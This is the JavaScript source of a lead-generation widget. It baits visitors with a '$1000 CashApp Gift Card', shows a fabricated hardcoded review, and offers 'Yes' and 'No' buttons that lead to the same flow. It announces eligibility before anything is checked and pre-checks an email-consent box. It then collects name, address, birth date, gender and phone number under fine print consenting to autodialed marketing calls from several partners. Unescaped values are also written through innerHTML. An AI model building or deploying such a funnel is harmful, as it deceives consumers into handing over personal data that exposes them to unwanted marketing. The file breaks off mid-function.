(function() {
  'use strict';

  // Extract site code from script data attribute or URL
  const scripts = document.getElementsByTagName('script');
  let siteCode = null;
  
  // Try to get site code from data attribute first
  for (let script of scripts) {
    if (script.getAttribute('data-site')) {
      siteCode = script.getAttribute('data-site');
      break;
    }
  }
  
  // Fallback to URL extraction if no data attribute found
  if (!siteCode) {
    const currentScript = scripts[scripts.length - 1];
    const scriptSrc = currentScript.src;
    siteCode = scriptSrc.match(/sites\/([^.]+)\.js/)?.[1];
  }

  if (!siteCode) {
    console.warn('CoReg: No site code found, widget available for manual configuration');
    siteCode = 'default'; // Set default for library usage
  }

  // Configuration
  const API_BASE = window.location.protocol + '//' + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
  
  // Generate session ID
  const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);

  class CoRegWidget {
    constructor() {
      this.questions = [];
      this.currentQuestionIndex = 0;
      this.responses = [];
      this.container = null;
      this.sessionCreated = false;
      this.sessionId = sessionId; // Allow external override
      this.siteCode = siteCode; // Allow external override
      this.apiBase = API_BASE; // Allow external override
      this.currentState = null; // Allow external state setting
      
      // Don't auto-init if being used externally
      if (!window.CoRegWidget) {
        this.init();
      }
    }

    async init() {
      try {
        // Load questions
        await this.loadQuestions();
        
        // Create session only if not already provided
        if (!this.sessionCreated) {
          await this.createSession();
        }
        
        // Create widget container but don't show it yet
        this.createContainer();
        
        // Don't show landing page automatically - wait for startQuestionnaire call
      } catch (error) {
        console.error('CoReg Widget Error:', error);
      }
    }

    async loadQuestions() {
      try {
        console.log('Loading questions from:', `${this.apiBase}/api/widget/questions`);
        const response = await fetch(`${this.apiBase}/api/widget/questions`);
        if (!response.ok) throw new Error('Failed to load questions');
        
        const allQuestions = await response.json();
        console.log('Raw questions received:', allQuestions.length);
        this.questions = allQuestions.sort((a, b) => a.priority - b.priority);
        console.log('Questions loaded:', this.questions.length);
      } catch (error) {
        console.error('Error loading questions:', error);
        this.questions = [];
      }
    }

    async createSession() {
      if (this.sessionCreated) return;
      
      try {
        const sessionData = {
          sessionId: this.sessionId,
          siteId: null, // Will be set by server based on site code
          device: this.getDeviceType(),
          state: this.getUserState(),
          userAgent: navigator.userAgent,
          ipAddress: null // Will be set by server
        };

        const response = await fetch(`${this.apiBase}/api/sessions`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(sessionData)
        });

        this.sessionCreated = response.ok;
      } catch (error) {
        console.error('Error creating session:', error);
      }
    }

    // Method to continue from existing session (used by Senior Benefits flow)
    continueFromSession(sessionId, siteCode) {
      this.sessionId = sessionId;
      this.siteCode = siteCode;
      this.sessionCreated = true; // Mark as already created
      console.log('Widget continuing from existing session:', { sessionId, siteCode });
    }

    createContainer() {
      // Only create container if one doesn't exist or hasn't been set externally
      if (!this.container) {
        // Create widget container as inline element
        this.container = document.createElement('div');
        this.container.id = 'coreg-widget';
        this.container.style.cssText = `
          width: 100%;
          max-width: 600px;
          margin: 20px auto;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          display: none;
        `;

        // Find the target container or append to body
        const targetElement = document.getElementById('widget-target') || document.body;
        targetElement.appendChild(this.container);
      }
    }

    showLandingPage() {
      this.container.innerHTML = `
        <!-- Green gradient background -->
        <div style="position: absolute; top: 0; left: 0; width: 100%; height: 40%; background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);"></div>
        
        <!-- Main content -->
        <div style="position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px;">
          <!-- Phone and cards visual -->
          <div style="position: relative; margin-bottom: 30px;">
            <div style="position: relative; background: #16a34a; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
              <div style="display: flex; align-items: center; color: white; margin-bottom: 15px;">
                <div style="width: 30px; height: 30px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                  <span style="color: #16a34a; font-weight: bold; font-size: 18px;">$</span>
                </div>
                <span style="font-size: 18px; font-weight: 600;">Cash App</span>
              </div>
              <div style="color: white; font-size: 48px; font-weight: bold;">$1000</div>
              <div style="color: rgba(255,255,255,0.8); font-size: 14px; margin-top: 5px;">GIFT CARD</div>
            </div>
          </div>
          
          <!-- Program requirements link -->
          <p style="margin: 0 0 20px 0; color: #6b7280; font-size: 12px; text-align: center;">
            Subject to completion of <a href="#" style="color: #3b82f6;">Program Requirements</a>
          </p>
          
          <!-- Main heading -->
          <h1 style="margin: 0 0 10px 0; color: #1f2937; font-size: 32px; font-weight: bold; text-align: center; line-height: 1.2;">
            Get your <span style="color: #16a34a;">$1000</span><br>
            CashApp Gift Card
          </h1>
          
          <!-- Question card -->
          <div style="background: white; border-radius: 15px; padding: 30px; max-width: 500px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin: 20px 0;">
            <p style="margin: 0 0 20px 0; color: #16a34a; font-size: 16px; font-weight: 600; text-align: center;">
              Answer question 1 of ${this.questions.length}
            </p>
            
            <h2 style="margin: 0 0 30px 0; color: #1f2937; font-size: 24px; font-weight: bold; text-align: center;">
              Do you shop online?
            </h2>
            
            <div style="display: flex; gap: 15px;">
              <button onclick="coregWidget.startQuestionnaire()" 
                      style="flex: 1; padding: 15px; background: #16a34a; color: white; border: none; border-radius: 25px; font-size: 18px; font-weight: 600; cursor: pointer;">
                Yes
              </button>
              <button onclick="coregWidget.startQuestionnaire()" 
                      style="flex: 1; padding: 15px; background: #16a34a; color: white; border: none; border-radius: 25px; font-size: 18px; font-weight: 600; cursor: pointer;">
                No
              </button>
            </div>
          </div>
          
          <!-- Reviews section -->
          <div style="background: white; border-radius: 15px; padding: 25px; max-width: 500px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-top: 20px;">
            <h3 style="margin: 0 0 20px 0; color: #1f2937; font-size: 18px; font-weight: bold; text-align: center;">
              Reviews
            </h3>
            
            <div style="display: flex; align-items: center; margin-bottom: 15px;">
              <div style="width: 40px; height: 40px; background: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">
                <span style="color: white; font-weight: bold;">D</span>
              </div>
              <div style="flex: 1;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                  <span style="color: #1f2937; font-weight: 600;">Daniel W</span>
                  <span style="color: #6b7280; font-size: 14px;">11/12</span>
                </div>
                <p style="margin: 5px 0 0 0; color: #6b7280; font-size: 14px;">
                  Thank you for support may God Bless you
                </p>
              </div>
            </div>
            
            <!-- Review dots -->
            <div style="display: flex; justify-content: center; gap: 8px; margin-top: 20px;">
              <div style="width: 8px; height: 8px; background: #d1d5db; border-radius: 50%;"></div>
              <div style="width: 8px; height: 8px; background: #d1d5db; border-radius: 50%;"></div>
              <div style="width: 8px; height: 8px; background: #16a34a; border-radius: 50%;"></div>
              <div style="width: 8px; height: 8px; background: #d1d5db; border-radius: 50%;"></div>
              <div style="width: 8px; height: 8px; background: #d1d5db; border-radius: 50%;"></div>
            </div>
          </div>
        </div>
        
        <!-- Close button -->
        <button onclick="document.getElementById('coreg-widget').remove()" 
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: white; font-weight: bold;">
          ×
        </button>
      `;
    }

    startQuestionnaire(email) {
      // Store the email if provided
      if (email) {
        this.userEmail = email;
      }
      
      // Show the widget container
      this.container.style.display = 'block';
      
      // Show personal info form first
      this.showPersonalInfoForm();
    }

    async showCurrentQuestion() {
      try {
        // Check if questions are loaded
        if (!this.questions || this.questions.length === 0) {
          console.log('No questions available, loading questions...');
          await this.loadQuestions();
          
          // If still no questions, show ad or thank you
          if (!this.questions || this.questions.length === 0) {
            console.log('No questions found, showing ad');
            this.showAd();
            return;
          }
        }

        if (this.currentQuestionIndex >= this.questions.length) {
          console.log('All questions completed, showing ad');
          this.showAd();
          return;
        }

        const question = this.questions[this.currentQuestionIndex];
        console.log('Showing question:', question.text);
        
        // Track question view/impression
        await this.trackQuestionView(question.id);
        
        this.container.innerHTML = `
          <!-- Blue Header -->
          <div style="background: #1e3a8a; color: white; text-align: center; padding: 20px; font-size: 18px; font-weight: 600; border-radius: 12px 12px 0 0;">
            Please Answer the Question Below
          </div>
          
          <!-- Question Card -->
          <div style="background: white; border-radius: 0 0 12px 12px; padding: 40px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
            <h2 style="margin: 0 0 30px 0; color: #1f2937; font-size: 24px; font-weight: 600; text-align: center; line-height: 1.4;">
              ${question.text}
            </h2>
            
            <div id="answer-options" style="margin-bottom: 30px;">
              ${this.renderAnswerOptions(question)}
            </div>
            
            <div style="text-align: center; margin-top: 30px;">
              <p style="margin: 0; color: #6b7280; font-size: 14px;">
                Learn more about how we use your information by visiting our Privacy Policy.
              </p>
            </div>
          </div>
          
          <!-- Close button -->
          <button onclick="document.getElementById('coreg-widget').remove()" 
                  style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: white; font-weight: bold;">
            ×
          </button>
        `;
        
        // Add event listeners for answer buttons
        this.attachEventListeners();
      } catch (error) {
        console.error('Error showing question:', error);
        // Fall back to showing ad if question display fails
        this.showAd();
      }
    }

    attachEventListeners() {
      // Handle answer button clicks
      const answerButtons = this.container.querySelectorAll('.widget-answer-btn');
      answerButtons.forEach(button => {
        button.addEventListener('click', (e) => {
          const answer = e.target.getAttribute('data-answer');
          console.log('Answer button clicked:', answer);
          this.selectAnswer(answer);
        });
      });

      // Handle continue button clicks
      const continueButtons = this.container.querySelectorAll('.widget-continue-btn');
      continueButtons.forEach(button => {
        button.addEventListener('click', () => {
          console.log('Continue button clicked');
          this.nextQuestion();
        });
      });

      // Handle ad click buttons
      const adClickButtons = this.container.querySelectorAll('.widget-ad-click-btn');
      adClickButtons.forEach(button => {
        button.addEventListener('click', (e) => {
          const url = e.target.getAttribute('data-url');
          console.log('Ad click button clicked:', url);
          this.clickAd(url);
        });
      });

      // Handle skip buttons
      const skipButtons = this.container.querySelectorAll('.widget-skip-btn');
      skipButtons.forEach(button => {
        button.addEventListener('click', () => {
          console.log('Skip button clicked');
          this.skipAd();
        });
      });
    }

    renderAnswerOptions(question) {
      const options = question.options || [];
      
      switch (question.type) {
        case 'multiple_choice':
        case 'radio':
          return options.map((option, index) => `
            <button type="button" data-answer="${option}" class="widget-answer-btn"
                    style="display: block; width: 100%; margin-bottom: 15px; padding: 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: all 0.2s; ${
                      option.toLowerCase() === 'yes' 
                        ? 'background: #10b981; color: white;' 
                        : 'background: #e5e7eb; color: #374151;'
                    } hover:transform: translateY(-2px); hover:box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
              ${option}
            </button>
          `).join('');
          
        case 'text':
          return `
            <input type="text" name="answer" placeholder="Type your answer..." 
                   style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.2s;" 
                   onfocus="this.style.borderColor='#3b82f6';" 
                   onblur="this.style.borderColor='#e5e7eb';">
            <button class="widget-continue-btn"
                    style="margin-top: 20px; width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">
              Continue
            </button>
          `;
          
        case 'select':
          return `
            <select name="answer" onchange="if(this.value) coregWidget.selectAnswer(this.value);" 
                    style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; background: white;">
              <option value="">Select an option...</option>
              ${options.map(option => `<option value="${option}">${option}</option>`).join('')}
            </select>
          `;
          
        default:
          return '<p style="color: #ef4444; text-align: center;">Unsupported question type</p>';
      }
    }

    selectAnswer(answer) {
      this.selectedAnswer = answer;
      // Automatically proceed to next question after selection
      setTimeout(() => {
        this.nextQuestion();
      }, 300); // Small delay for visual feedback
    }

    async nextQuestion() {
      const answer = this.selectedAnswer || this.getSelectedAnswer();
      if (!answer) {
        alert('Please select an answer before continuing.');
        return;
      }

      // Save response
      const response = {
        questionId: this.questions[this.currentQuestionIndex].id,
        questionType: this.questions[this.currentQuestionIndex].type,
        answer: answer
      };
      
      this.responses.push(response);
      
      // Send response to server
      await this.saveResponse(response);
      
      // Clear selected answer
      this.selectedAnswer = null;
      
      this.currentQuestionIndex++;
      this.showCurrentQuestion();
    }

    previousQuestion() {
      if (this.currentQuestionIndex > 0) {
        this.currentQuestionIndex--;
        this.responses.pop(); // Remove last response
        this.showCurrentQuestion();
      }
    }

    getSelectedAnswer() {
      const answerInput = this.container.querySelector('input[name="answer"]:checked, input[name="answer"][type="text"], select[name="answer"]');
      return answerInput ? answerInput.value.trim() : '';
    }

    async saveResponse(response) {
      try {
        await fetch(`${this.apiBase}/api/responses`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: this.sessionId,
            questionId: response.questionId,
            answer: response.answer
          })
        });
      } catch (error) {
        console.error('Error saving response:', error);
      }
    }

    async trackQuestionView(questionId) {
      try {
        await fetch(`${this.apiBase}/api/question-views`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: this.sessionId,
            questionId: questionId,
            timestamp: new Date().toISOString()
          })
        });
      } catch (error) {
        console.error('Error tracking question view:', error);
      }
    }

    showEmailCapture() {
      this.container.innerHTML = `
        <!-- Blue Header -->
        <div style="position: absolute; top: 0; left: 0; width: 100%; background: #1e3a8a; color: white; text-align: center; padding: 20px 0; font-size: 18px; font-weight: 600;">
          Almost Done!
        </div>
        
        <!-- Email Capture Card -->
        <div style="background: white; border-radius: 12px; padding: 40px; max-width: 500px; width: 90%; margin: 0 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);">
          <h2 style="margin: 0 0 20px 0; color: #1f2937; font-size: 24px; font-weight: 600; text-align: center; line-height: 1.4;">
            Enter your email to claim your $1000 CashApp Gift Card
          </h2>
          
          <p style="margin: 0 0 30px 0; color: #6b7280; font-size: 16px; text-align: center;">
            We'll send you updates about your gift card status and exclusive offers.
          </p>
          
          <form style="margin-bottom: 20px;">
            <input type="email" id="email-input" placeholder="Enter your email address" 
                   style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; box-sizing: border-box;" 
                   onfocus="this.style.borderColor='#3b82f6';" 
                   onblur="this.style.borderColor='#e5e7eb';">
            
            <button type="button" onclick="coregWidget.submitEmail()" 
                    style="width: 100%; padding: 15px; background: #16a34a; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">
              Claim My $1000 Gift Card
            </button>
          </form>
          
          <div style="text-align: center;">
            <label style="display: flex; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 15px;">
              <input type="checkbox" id="email-consent" checked style="margin-right: 8px;">
              <span style="color: #6b7280; font-size: 14px;">I agree to receive email updates and offers</span>
            </label>
            
            <p style="margin: 0; color: #6b7280; font-size: 12px;">
              By submitting, you agree to our Terms of Service and Privacy Policy.
            </p>
          </div>
        </div>
        
        <!-- Close button -->
        <button onclick="document.getElementById('coreg-widget').remove()" 
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: white; font-weight: bold;">
          ×
        </button>
      `;
    }

    async submitEmail() {
      const emailInput = this.container.querySelector('#email-input');
      const email = emailInput.value.trim();
      
      if (!email) {
        alert('Please enter your email address');
        return;
      }
      
      if (!email.includes('@')) {
        alert('Please enter a valid email address');
        return;
      }
      
      // Store email for later use
      this.userEmail = email;
      
      // Show personal information collection form
      this.showPersonalInfoForm();
    }

    showPersonalInfoForm() {
      this.container.innerHTML = `
        <!-- Blue Header -->
        <div style="background: #1e3a8a; color: white; text-align: center; padding: 20px; font-size: 18px; font-weight: 600; border-radius: 12px 12px 0 0;">
          Hey Hey! Your Email Is Eligible.
        </div>
        
        <!-- Personal Info Form -->
        <div style="background: white; border-radius: 0 0 12px 12px; padding: 30px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
          <form id="personal-info-form">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
              <div>
                <input type="text" id="first-name" placeholder="First Name" required
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';">
              </div>
              <div>
                <input type="text" id="last-name" placeholder="Last Name" required
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';">
              </div>
            </div>
            
            <div style="margin-bottom: 15px;">
              <input type="text" id="street-address" placeholder="Street Address" required
                     style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                     onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';">
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-bottom: 15px;">
              <div>
                <input type="text" id="city" placeholder="City" required
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';">
              </div>
              <div>
                <select id="state" required
                        style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box; background: white;"
                        onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';">
                  <option value="">State</option>
                  <option value="AL">AL</option><option value="AK">AK</option><option value="AZ">AZ</option><option value="AR">AR</option>
                  <option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DE">DE</option>
                  <option value="FL">FL</option><option value="GA">GA</option><option value="HI">HI</option><option value="ID">ID</option>
                  <option value="IL">IL</option><option value="IN">IN</option><option value="IA">IA</option><option value="KS">KS</option>
                  <option value="KY">KY</option><option value="LA">LA</option><option value="ME">ME</option><option value="MD">MD</option>
                  <option value="MA">MA</option><option value="MI">MI</option><option value="MN">MN</option><option value="MS">MS</option>
                  <option value="MO">MO</option><option value="MT">MT</option><option value="NE">NE</option><option value="NV">NV</option>
                  <option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NY">NY</option>
                  <option value="NC">NC</option><option value="ND">ND</option><option value="OH">OH</option><option value="OK">OK</option>
                  <option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option><option value="SC">SC</option>
                  <option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option>
                  <option value="VT">VT</option><option value="VA">VA</option><option value="WA">WA</option><option value="WV">WV</option>
                  <option value="WI">WI</option><option value="WY">WY</option>
                </select>
              </div>
              <div>
                <input type="text" id="zip-code" placeholder="Zip Code" required maxlength="5"
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';"
                       pattern="[0-9]{5}" oninput="this.value = this.value.replace(/[^0-9]/g, '').substring(0, 5)">
              </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
              <div>
                <button type="button" id="gender-female" onclick="coregWidget.selectGender('female')"
                        style="width: 100%; padding: 15px; border: 2px solid #9ca3af; border-radius: 25px; font-size: 16px; background: #f3f4f6; color: #6b7280; cursor: pointer; transition: all 0.2s;">
                  FEMALE
                </button>
              </div>
              <div>
                <button type="button" id="gender-male" onclick="coregWidget.selectGender('male')"
                        style="width: 100%; padding: 15px; border: 2px solid #22c55e; border-radius: 25px; font-size: 16px; background: #22c55e; color: white; cursor: pointer; transition: all 0.2s;">
                  MALE
                </button>
              </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
              <div>
                <input type="text" id="date-of-birth" placeholder="Date Of Birth (MM/DD/YYYY)" required maxlength="10"
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';"
                       oninput="coregWidget.formatDateOfBirth(this)" 
                       pattern="(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/[0-9]{4}">
              </div>
              <div>
                <input type="tel" id="phone-number" placeholder="Phone Number (000) 000-0000" required maxlength="14"
                       style="width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 25px; font-size: 16px; outline: none; box-sizing: border-box;"
                       onfocus="this.style.borderColor='#3b82f6';" onblur="this.style.borderColor='#e5e7eb';"
                       oninput="coregWidget.formatPhoneNumber(this)"
                       pattern="\\([0-9]{3}\\) [0-9]{3}-[0-9]{4}">
              </div>
            </div>
            
            <div style="margin-bottom: 20px; padding: 15px; border: 2px solid #ef4444; border-radius: 10px; background: #fef2f2;">
              <label style="display: flex; align-items: flex-start; cursor: pointer;">
                <input type="checkbox" id="consent-checkbox" required style="margin-right: 10px; margin-top: 2px; transform: scale(1.2);">
                <span style="color: #dc2626; font-size: 14px; line-height: 1.4;">
                  I confirm all my information is accurate and consent to be contacted as provided below.
                </span>
              </label>
            </div>
            
            <div style="margin-bottom: 20px; padding: 15px; background: #f8fafc; border-radius: 8px;">
              <p style="margin: 0; color: #475569; font-size: 12px; line-height: 1.5;">
                By checking the box above I expressly consent to receive marketing and informational phone calls and text messages from Super Samples, Unified Marketing Partners LLC, Americas Health, Benefitlink and our Marketing Partners on the land line and/or mobile number I provided. I confirm that the phone number set forth above is accurate and I am the regular user of the phone. I understand these calls may be generated using an autodialer and may contain pre-recorded and artificial voice messages and I do not need to check the box to participate in the deals promoted, offers or to claim a Reward. For SMS message campaigns: Text STOP to stop and HELP for help. Msg & data rates may apply. Periodic messages; max. 30 / month.
              </p>
            </div>
            
            <button type="button" onclick="coregWidget.submitPersonalInfo()"
                    style="width: 100%; padding: 15px; background: #16a34a; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s;"
                    onmouseover="this.style.background='#15803d';" onmouseout="this.style.background='#16a34a';">
              Continue to Claim Reward
            </button>
          </form>
        </div>
      `;
      
      // Set default gender to male (as shown selected in the image)
      this.selectedGender = 'male';
    }

    selectGender(gender) {
      this.selectedGender = gender;
      
      const femaleBtn = this.container.querySelector('#gender-female');
      const maleBtn = this.container.querySelector('#gender-male');
      
      if (gender === 'female') {
        femaleBtn.style.background = '#22c55e';
        femaleBtn.style.color = 'white';
        femaleBtn.style.borderColor = '#22c55e';
        maleBtn.style.background = '#f3f4f6';
        maleBtn.style.color = '#6b7280';
        maleBtn.style.borderColor = '#9ca3af';
      } else {
        maleBtn.style.background = '#22c55e';
        maleBtn.style.color = 'white';
        maleBtn.style.borderColor = '#22c55e';
        femaleBtn.style.background = '#f3f4f6';
        femaleBtn.style.color = '#6b7280';
        femaleBtn.style.borderColor = '#9ca3af';
      }
    }

    async submitPersonalInfo() {
      const firstName = this.container.querySelector('#first-name').value.trim();
      const lastName = this.container.querySelector('#last-name').value.trim();
      const streetAddress = this.container.querySelector('#street-address').value.trim();
      const city = this.container.querySelector('#city').value.trim();
      const state = this.container.querySelector('#state').value;
      const zipCode = this.container.querySelector('#zip-code').value.trim();
      const dateOfBirth = this.container.querySelector('#date-of-birth').value.trim();
      const phoneNumber = this.container.querySelector('#phone-number').value.trim();
      const consentChecked = this.container.querySelector('#consent-checkbox').checked;
      
      // Validation
      if (!firstName || !lastName || !streetAddress || !city || !state || !zipCode || !dateOfBirth || !phoneNumber) {
        alert('Please fill in all required fields');
        return;
      }
      
      if (!this.selectedGender) {
        alert('Please select your gender');
        return;
      }
      
      if (!consentChecked) {
        alert('Please confirm your information and consent to be contacted');
        return;
      }
      
      // Validate date of birth
      if (!this.validateDateOfBirth(dateOfBirth)) {
        alert('Please enter a valid date of birth (MM/DD/YYYY). You must be at least 13 years old.');
        return;
      }
      
      // Validate phone number
      if (!this.validatePhoneNumber(phoneNumber)) {
        alert('Please enter a valid phone number in (000) 000-0000 format');
        return;
      }
      
      // Save all collected data to database
      try {
        await fetch(`${this.apiBase}/api/collect-personal-info`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: this.sessionId,
            email: this.userEmail,
            firstName: firstName,
            lastName: lastName,
            streetAddress: streetAddress,
            city: city,
            state: state,
            zipCode: zipCode,
            gender: this.selectedGender,
            dateOfBirth: dateOfBirth,
            phoneNumber: phoneNumber,
            consentGiven: consentChecked,
            timestamp: new Date().toISOString(),
            deviceType: this.getDeviceType(),
            userAgent: navigator.userAgent,
            ipAddress: null // Will be populated server-side
          })
        });
        
        // Start questions after collecting personal info
        console.log('Personal info saved, starting questions...');
        this.showCurrentQuestion();
      } catch (error) {
        console.error('Error saving personal information:', error);
        // Still start questions even if save fails
        console.log('Error saving personal info, but continuing to questions...');
        this.showCurrentQuestion();
      }
    }

    async showAd() {
      try {
        // Request ad based on responses
        const adRequest = {
          sessionId: this.sessionId,
          siteCode: this.siteCode,
          questionResponses: this.responses,
          userProfile: {
            device: this.getDeviceType(),
            state: this.getUserState(),
            email: this.userEmail
          }
        };

        const response = await fetch(`${this.apiBase}/api/serve-ad`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(adRequest)
        });

        const adData = await response.json();
        
        if (adData.campaign) {
          this.renderAd(adData.campaign);
        } else {
          this.showThankYou();
        }
      } catch (error) {
        console.error('Error loading ad:', error);
        this.showThankYou();
      }
    }

    renderAd(campaign) {
      this.currentCampaign = campaign;
      
      this.container.innerHTML = `
        <!-- Blue Header -->
        <div style="position: absolute; top: 0; left: 0; width: 100%; background: #1e3a8a; color: white; text-align: center; padding: 20px 0; font-size: 18px; font-weight: 600;">
          Thank You for Your Response!
        </div>
        
        <!-- Ad Card -->
        <div style="background: white; border-radius: 12px; padding: 40px; max-width: 500px; width: 90%; margin: 0 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center;">
          ${campaign.imageUrl ? `
            <img src="${campaign.imageUrl}" alt="${campaign.name}" 
                 style="width: 100%; max-width: 300px; height: auto; border-radius: 12px; margin-bottom: 20px;">
          ` : ''}
          
          <h2 style="margin: 0 0 15px 0; color: #1f2937; font-size: 24px; font-weight: 600;">
            ${campaign.name}
          </h2>
          
          <p style="margin: 0 0 25px 0; color: #6b7280; font-size: 16px; line-height: 1.5;">
            Based on your responses, this offer might interest you.
          </p>
          
          <div style="display: flex; gap: 15px; justify-content: center; margin-bottom: 20px;">
            <button class="widget-ad-click-btn" data-url="${campaign.url}"
                    style="padding: 15px 30px; background: #10b981; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; transition: background 0.2s;">
              Learn More
            </button>
            
            <button class="widget-skip-btn"
                    style="padding: 10px 20px; background: #6b7280; color: white; border: none; border-radius: 8px; font-size: 14px; cursor: pointer;">
              Skip
            </button>
          </div>
          
          <p style="margin: 0; color: #6b7280; font-size: 14px;">
            Thank you for completing our questionnaire!
          </p>
        </div>
        
        <!-- Close button -->
        <button onclick="document.getElementById('coreg-widget').remove()" 
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: white; font-weight: bold;">
          ×
        </button>
      `;
      
      // Add event listeners for ad buttons
      this.attachEventListeners();
    }

    showThankYou() {
      this.container.innerHTML = `
        <!-- Blue Header -->
        <div style="position: absolute; top: 0; left: 0; width: 100%; background: #1e3a8a; color: white; text-align: center; padding: 20px 0; font-size: 18px; font-weight: 600;">
          Thank You for Your Response!
        </div>
        
        <!-- Thank You Card -->
        <div style="background: white; border-radius: 12px; padding: 40px; max-width: 500px; width: 90%; margin: 0 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center;">
          <h2 style="margin: 0 0 20px 0; color: #1f2937; font-size: 24px; font-weight: 600;">
            Thank You!
          </h2>
          
          <p style="margin: 0 0 25px 0; color: #6b7280; font-size: 16px; line-height: 1.5;">
            Thank you for completing our questionnaire. Your responses help us provide better content.
          </p>
          
          <button onclick="document.getElementById('coreg-widget').remove()" 
                  style="padding: 15px 30px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;">
            Close
          </button>
        </div>
        
        <!-- Close button -->
        <button onclick="document.getElementById('coreg-widget').remove()" 
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: white; font-weight: bold;">
          ×
        </button>
      `;
    }

    formatDateOfBirth(input) {
      let value = input.value.replace(/\D/g, ''); // Remove all non-digits
      
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
      }
      if (value.length >= 5) {
        value = value.substring(0, 5) + '/' + value.substring(5);
      }
      if (value.length > 10) {
        value = value.substring(0, 10);
      }
      
      input.value = value;
    }

    formatPhoneNumber(input) {
      let value = input.value.replace(/\D/g, ''); // Remove all non-digits
      
      if (value.length >= 3) {
        value = '(' + value.substring(0, 3) + ') ' + value.substring(3);
      }
      if (value.length >= 9) {
        value = value.substring(0, 9) + '-' + value.substring(9);
      }
      if (value.length > 14) {
        value = value.substring(0, 14);
      }
      
      input.value = value;
    }

    validateDateOfBirth(dateStr) {
